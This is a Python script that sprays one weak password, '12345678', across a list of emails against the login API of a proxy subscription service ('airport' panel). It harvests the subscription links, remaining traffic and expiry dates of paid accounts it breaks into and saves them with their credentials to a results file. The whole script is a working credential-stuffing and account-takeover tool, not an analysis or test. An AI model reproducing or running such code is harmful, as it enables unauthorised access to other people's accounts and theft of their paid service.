# -*- coding: utf-8 -*-
import requests
import time
import datetime

# 防止机场面板服务器卡死，不使用并发
proxies = {
    'http': 'http://127.0.0.1:10809',
    'https': 'http://127.0.0.1:10809'
}
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (HTML, like Gecko) Chrome/108.0.0.0 '
                  'Safari/537.36'}

domain = 'https://www.paopao.dog/'
login_url = domain + 'api/v1/passport/auth/login'
subinfo_link = domain + 'api/v1/user/getSubscribe'

emails = open('机场users.txt')
for i in emails:
    post_data = {'email': i,
                 'password': '12345678',
                 }
    try:
        resp = requests.post(url=login_url, data=post_data, headers=headers, proxies=proxies, timeout=20)
        auth_data = resp.json()['data']['auth_data']
        header = {'Authorization': auth_data}
        # print(resp.text)
        resp1 = requests.get(url=subinfo_link, headers=header, proxies=proxies, timeout=20)
        # print(resp1.text)
        j = resp1.json()["data"]["plan_id"]
        # if j != 'None':  # 根据机场套餐id调整
        if j != 'None' and str(j) != '1':  # 根据机场套餐id调整，当前机场套餐id为1的是体验套餐
            sub_link = resp1.json()["data"]["subscribe_url"]
            traffic_download = resp1.json()["data"]["d"]
            traffic_total = resp1.json()["data"]["transfer_enable"]
            traffic_balance = str(round((traffic_total - traffic_download) / 1024 / 1024 / 1024, 2))
            expired_at = resp1.json()["data"]["expired_at"]
            if str(expired_at) == 'None':
                overtime = '未知'
            elif resp1.json()["data"]["expired_at"] <= int(time.time()):
                continue
            else:
                timeStamp = resp1.json()["data"]["expired_at"]
                dateArray = datetime.datetime.utcfromtimestamp(timeStamp)
                overtime = dateArray.strftime("%Y-%m-%d %H:%M:%S")
            sub_plan = resp1.json()["data"]["plan"]["name"]
            sub_plan1 = sub_plan.encode('unicode_escape').decode('unicode_escape')
            with open('机场result_OK.txt', 'a') as f1:
                result = '账号：' + i + '密码：' + '12345678' + '\n' + '套餐名称：' + sub_plan1 + '\n' + '剩余流量：' + traffic_balance + 'GB' + '\n' + '到期时间：' + overtime + '\n' + '订阅链接：' + sub_link + '\n\n'
                print(result)
                f1.write(result)
                time.sleep(1)
        else:
            continue
    except Exception as e:
        print('======无有效订阅，切换下一位用户======')

emails.close()
